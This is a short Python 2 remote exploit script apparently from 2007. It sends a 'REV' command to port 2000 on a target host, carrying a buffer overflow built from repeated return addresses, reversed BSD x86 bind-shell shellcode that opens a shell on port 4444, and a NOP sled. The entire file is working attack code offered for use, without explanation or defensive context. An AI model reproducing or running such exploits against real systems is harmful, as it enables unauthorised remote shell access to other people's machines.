#!/usr/bin/env python
# syn 05/25/2007

# spawns a shell port on 4444
# use the echo to view what the shell is doing
# echo `id`

import socket
import sys

def usage():
        print 'Usage: %s targethost' % sys.argv[0]
        sys.exit(0)

if len(sys.argv) - 1 < 1:
        usage()

def send_socket(host, port, message):

	s = None
	size = 1024
	try:
    		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    		s.connect((host,port))
	except socket.error, (value,message):
    		if s:
        		s.close()
    		print "Could not open socket: " + message
    		sys.exit(1)
	s.send(message)
	data = s.recv(size)
	s.close()
	print 'Received:', data

host = sys.argv[1]
port = 2000

# this exploit is built backwards as the reverse function runs before we can overflow the buffer.
address="\xbf\x8f\xde\x10"*50

# bsd/x86/shell_bind_tcp - 73 bytes
# http://www.metasploit.com
# LPORT=4444
shell = "\x31\xc0\x50\x68\xff\x02"
shell += "\x11\x5c"			#port in hex
shell += "\x89\xe7\x50\x6a\x01\x6a"
shell += "\x02\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd"
shell += "\x80\x89\x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50"
shell += "\x6a\x5a\x58\xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f"
shell += "\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0"
shell += "\x3b\xcd\x80"

#reverse the source to work with this exploit =/
shell = shell[::-1]

nop = "\x90"*827
message = "REV %s%s%s" % (address,shell,nop)
print "+%s+" % (len(message))

send_socket(host, port, message)
